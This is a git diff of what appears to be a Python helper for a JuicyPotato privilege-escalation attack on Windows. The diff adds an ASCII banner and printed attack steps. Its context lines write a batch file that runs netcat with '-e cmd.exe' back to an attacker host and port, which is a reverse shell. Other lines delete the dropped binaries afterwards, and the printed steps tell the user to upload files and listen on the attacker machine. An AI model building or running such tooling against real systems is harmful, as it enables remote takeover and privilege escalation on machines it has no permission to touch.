@@ -29,7 +29,43 @@ class bcolors:
     UNDERLINE = '\033[4m'
 
 
+def banner():
+        print(bcolors().WARNING)
+        print("""
 
+
+        __________         __           __________       __          __          
+        \______   \_____ _/  |_         \______   \_____/  |______ _/  |_  ____  
+        |    |  _/\__  \\   __\  ______ |     ___/  _ \   __\__  \\   __\/  _ \ 
+        |    |   \ / __ \|  |   /_____/ |    |  (  <_> )  |  / __ \|  | (  <_> )
+        |______  /(____  /__|           |____|   \____/|__| (____  /__|  \____/ 
+                \/      \/                                        \/             
+
+
+     
+                                    ▄▄
+                        ,╓,         ║▓█▄
+                        ╙████▄▄▄█████████▄
+                         █▓████████████████
+                         J▓▓███████████████▌
+                          ██████████████████⌐
+                          ██████████████████▌
+                          ██▀████▀▄▄█████████
+                          ▐██████████████████w
+                           ███████▀▀╨░░░╫████▌
+                            ▓░░╠░░░░░░░╦▓█████
+                           ▄█▀█▌█▀▀▀▓▓▓███████▄▄,             ,▄▄▄▓▓██████▓▄▄
+                          ▄█▌`░▓▀█▓╫╫████████████████████████████████████▀█████
+                         ,▀▀▀╬╫╫▓▓▓╫▓███████████████████████████▀███▌ ▀██ `██M██
+                         ' ,,»╙▀▀▀▀╨░░░░╠▀▀▀███████████████▌ ▀██  ╙█▌  ▐▀  ║▀  █
+                        ▐µ╦░░░░░░░░░░░░░░░░░╨╫███-▀███M `▀█▌  ╚┘   └
+                         ▓░░░░░░░░░░░░░░░░░╦╫╫▀▀"   ╙Γ
+                          ╫╦░░░░░░░░░░░░╦╬╫╫▓┘
+                           ╙▀▒╫╫╫╫╫╫╫╫╫╫▓▓▀╨
+                              ╙╙▀▀▀▀▀▀▀▀└
+     
+     
+     """)
 def create_bat_shell():
         file = open(SHELL_BAT_NAME, "w")
         file.write(f"{JUICY_REMOTE_PATH}\\{NC_BIN} -e cmd.exe {LHOST} {LPORT}")
@@ -54,18 +90,19 @@ def create_bat_potato():
         
         file.write("del {JUICY_REMOTE_PATH}\\{SHELL_BAT_NAME}")
         file.write("del {JUICY_REMOTE_PATH}\\{JUICY_POTATO_BIN}")
-
         file.close()
+        
         print(f"{bcolors.OKGREEN}[+] {OUTPUT_BAT_NAME} created.{bcolors.OKGREEN}")
 
 def main():
         print("\n")
         create_bat_potato()
         create_bat_shell()
-
-        print("\n\n -------------------------------------\n\n")
+        banner()
+        print(f"\n\n {bcolors.OKGREEN}-------------------------------------\n\n{bcolors.OKGREEN}") 
         print(f"{bcolors.OKBLUE}[+] Python WebServer listening on{bcolors.OKBLUE}:")
         print(f"{bcolors.OKCYAN}==> {bcolors.UNDERLINE}http://{LHOST} {LWEBSERVER_PORT}{bcolors.ENDC}{bcolors.ENDC}\n")
+        print(f"{bcolors.FAIL}STEPS:\n")
         print(f"{bcolors.FAIL}[-] Upload {OUTPUT_BAT_NAME} on server ")
         print(f"{bcolors.FAIL}[-] Upload {WGET_BIN} on server ")
         print(f'[-] Open new tab and listen on machine attacker on port {LPORT}')
